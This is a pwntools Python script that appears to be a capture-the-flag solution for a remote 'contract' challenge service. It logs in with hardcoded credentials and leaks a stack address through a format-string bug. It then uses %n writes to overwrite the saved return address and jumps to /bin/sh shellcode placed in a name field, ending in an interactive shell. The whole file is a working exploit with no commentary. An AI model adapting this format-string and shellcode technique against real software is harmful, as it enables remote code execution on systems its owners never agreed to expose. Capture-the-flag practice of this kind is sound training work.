from pwn import *

context.encoding = 'ascii'
context.update(arch='i386', os='linux')

shellcode = shellcraft.sh()
#print(shellcode)
name = "future shellcode"

# io = process("./contract_new")
# gdb.attach(io, gdbscript='''
# # b *(main_loop + 0x61e)
# b *(main_loop + 0x623)
# continue
# ''')

io = remote("contract.challenge.operation-kernel.fr", 10000, ssl=True)

payload_addr_name = b"%x"

io.recvuntil("Login: ") 
io.sendline("Administrathor")
io.recvuntil("Password: ")
io.sendline("gH5pFtpm")
print(io.recvline().decode().strip())
io.recvuntil("[?] Choice (user): ")
io.sendline("1")
io.recvuntil("Name    : ")
io.sendline(name)
io.recvuntil("Surname : ")
io.sendline(payload_addr_name)
io.recvuntil("Address : ")
io.sendline("address")
io.recvuntil("[?] Choice (user): ")
io.sendline("4")
io.recvuntil("Surname :")

name_addr_hex = io.recvline().strip()
name_addr = int(name_addr_hex, 16) - 1 #stack align
log.info("Name Address: 0x" + str(name_addr_hex.decode()))

io.recvuntil("(y/N)")
io.sendline("y")
io.recvuntil("(y/N)")
io.sendline("y")

h = hex(name_addr)[2:]
eip_addr = name_addr + 0x300
log.info("EIP stored at " + hex(eip_addr))
name = asm(shellcode)

payload_write = b"%" + str(int(h[4:], 16) + 1).encode() + b"x%107$n%" + str(int(h[:4], 16) - int(h[4:], 16) - 1).encode() + b"x%108$n"

io.recvuntil("[?] Choice (user): ")
io.sendline("1")
io.recvuntil("Name    : ")
io.sendline(name)
io.recvuntil("Surname : ")
io.sendline(payload_write)
io.recvuntil("Address : ")
io.sendline(b'AAA' + struct.pack('I', eip_addr) + struct.pack('I', eip_addr + 2)) # available on stack+107 (offset for the null byte), stack+108 for high bytes
io.recvuntil("[?] Choice (user): ")
io.sendline("4")
io.recvuntil("Surname :")
retour =io.recvline()
# print(retour)
io.recvuntil("(y/N)")
io.sendline("y")
io.recvuntil("(y/N)")
io.sendline("n")

io.interactive()
